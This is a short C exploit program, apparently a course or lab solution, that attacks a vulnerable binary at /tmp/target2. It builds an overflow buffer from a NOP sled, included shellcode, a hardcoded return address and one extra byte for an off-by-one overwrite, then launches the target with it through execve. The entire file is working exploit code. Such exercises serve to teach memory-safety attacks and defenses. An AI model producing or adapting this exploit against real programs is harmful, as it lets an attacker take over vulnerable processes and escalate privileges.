#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  char instructions[201];

  // NOP instructions
  memset(instructions, '\x90', 201);
  // shellcode
  strncpy(instructions+(195-strlen(shellcode)), shellcode, strlen(shellcode));
  // return address to pop 0xbffffce0
  strncpy(instructions+196, "\xe0\xfc\xff\xbf", 4);
  // last byte overflow
  strncpy(instructions+200, "\x90", 1);

  args[0] = TARGET; args[1] = instructions; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
